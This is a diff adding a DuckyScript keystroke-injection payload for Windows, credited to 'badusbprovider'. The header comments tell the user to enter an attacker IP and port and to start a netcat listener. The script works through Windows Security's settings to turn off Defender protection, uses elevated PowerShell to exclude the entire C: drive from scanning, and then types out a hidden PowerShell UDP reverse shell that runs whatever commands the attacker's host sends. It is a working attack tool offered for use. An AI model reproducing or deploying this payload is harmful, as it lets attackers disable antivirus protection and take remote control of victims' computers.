@@ -1,0 +1,61 @@
+REM       ReverseDucky3 Rewrite_With Windows Defender Security Disabler
+REM       Version 1.0
+REM       OS: Windows
+REM       Author: badusbprovider
+REM       May be a firewall popup it executes anyway.
+REM       Fill in Attacker-IP and Port
+REM       YOU MUST START THE Listener: nc -ul -p PORT
+DELAY 1500
+CTRL ESC
+DELAY 2500
+STRING Windows Defender S
+DELAY 250
+ENTER
+DELAY 100
+ENTER
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+ENTER
+DELAY 500
+SPACE
+DELAY 1000
+ALT y
+DELAY 1000
+ALT F4
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT y
+DELAY 1000
+STRING Add-MpPreference -ExclusionPath “C:”
+ENTER
+DELAY 2000
+STRING EXIT
+ENTER
+DELAY 1500
+GUI r
+DELAY 2500
+STRING powershell -NoP -NonI -W hidden
+DELAY 2500
+ENTER
+DELAY 2500
+STRING $E=New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse("0.0.0.0"),PORT);$C=New-Object System.Net.So
+DELAY 2500
+STRING ckets.UDPClient(53);[byte[]]$B=0..65535|%{0};$SB=([text.encoding]::ASCII).GetBytes('ReverseDuckyIII:');$C.Send($SB,$S
+DELAY 2500
+STRING B.Length,$E);while($true){;$R=$C.Receive([ref]$E);$RD=([text.encoding]::ASCII).GetString($R);$s=(iex $RD 2>&1 | Out-S
+DELAY 2500
+STRING tring );$s2=$s+'PS ' + (pwd).Path + '> ';$SB =([text.encoding]::ASCII).GetBytes($s2);$C.Send($SB,$SB.Len
+DELAY 2500
+STRING gth,$E)};$C.Close()
+ENTER
